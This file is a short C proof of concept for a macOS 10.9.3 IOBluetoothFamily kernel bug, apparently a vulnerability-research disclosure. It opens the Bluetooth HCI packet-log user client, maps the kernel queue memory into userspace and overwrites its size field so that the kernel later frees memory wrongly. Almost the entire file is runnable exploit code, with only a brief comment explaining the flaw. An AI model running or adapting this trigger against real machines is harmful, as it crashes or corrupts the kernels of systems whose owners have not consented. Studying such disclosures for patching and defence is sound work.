/*

clang -o bluetooth_packet_log_bad_free bluetooth_packet_log_bad_free.c -framework IOKit 

IOBluetoothFamily implements its own queuing primitive: IOBluetoothDataQueue (doesn't appear
to inherit from IODataQueue, but I could be wrong about that?)

IOBluetoothHCIPacketLogUserClient is userclient type 1 of IOBluetoothHCIController.

The IOBluetoothDataQueue free method uses the queue size field which was mapped into userspace
when freeing the queue - a userspace client can modify this field forcing a bad kmem_free.

tested on: MacBookAir5,2 w/ 10.9.3/13d64
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <IOKit/IOKitLib.h>

int main(){
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IOBluetoothHCIController");
  if(!matching){
    printf("unable to create service matching dictionary\n");
    return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
    printf("no matches\n");
    return 0;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return 0;
  }
  printf("got service: %x\n", service);


  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 1, &conn);
  if (err != KERN_SUCCESS){
    printf("unable to get user client connection\n");
    return 0;
  }else{
    printf("got userclient connection: %x, type:%d\n", conn, 1);
  }
  
  printf("got userclient connection: %x\n", conn);


  mach_vm_address_t addr = 0x4100000000;
  mach_vm_size_t size = 0x1000;
  uint32_t* buf = 0;

  err = IOConnectMapMemory(conn, 0x1000, mach_task_self(), &addr, &size, 0);
  if (err != KERN_SUCCESS){
    printf("IOConnectMapMemory failed:0x%x\n", err);
    return 0;
  }

  buf = (uint32_t*)addr;
  printf("mapped at: 0x%p size:0x%x\n", addr, size);

  for (int i = 0; i < 3; i++){
    printf("0x%08x\n", buf[i]);
  }

  // overwrite the size field
  buf[0] = 0x12000;

  printf("probably crashing soon\n");
  
  return 0;
}
